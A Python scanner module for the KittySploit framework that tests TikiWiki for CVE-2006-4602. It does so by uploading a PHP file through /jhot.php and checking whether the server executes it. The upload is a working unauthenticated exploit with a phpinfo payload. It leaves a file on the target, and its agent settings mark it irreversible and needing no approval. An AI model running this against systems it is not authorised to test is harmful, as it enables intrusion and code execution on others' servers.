#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""TikiWiki jhot.php arbitrary PHP upload (CVE-2006-4602)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'TikiWiki - jhot.php Upload Detection (CVE-2006-4602)',
        'description': (
            'Detects CVE-2006-4602 by uploading a PHP file via /jhot.php and '
            'verifying phpinfo under /img/wiki/.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2006', 'tikiwiki', 'upload', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': False,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.2,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2006-4602',
        ],
        'cve': 'CVE-2006-4602',
    }

    def run(self):
        fname = self.random_text(8) + '.php'
        boundary = '----KSBoundaryTiki'
        body = (
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="filepath"; filename="{fname}"\r\n'
            'Content-Type: application/octet-stream\r\n\r\n'
            '<?php phpinfo(); ?>\r\n'
            f'--{boundary}--\r\n'
        )
        for base in ('', '/tiki', '/tikiwiki'):
            r = self.http_request(
                method='POST',
                path=f'{base}/jhot.php',
                data=body,
                headers={'Content-Type': f'multipart/form-data; boundary={boundary}'},
                allow_redirects=False,
            )
            if not r:
                continue
            g = self.http_request(
                method='GET',
                path=f'{base}/img/wiki/{fname}',
                allow_redirects=False,
            )
            if g and '<title>phpinfo()' in (g.text or ''):
                self.set_info(
                    severity='critical',
                    reason='TikiWiki jhot.php upload (CVE-2006-4602)',
                    path=f'{base}/jhot.php',
                )
                return True
        return False
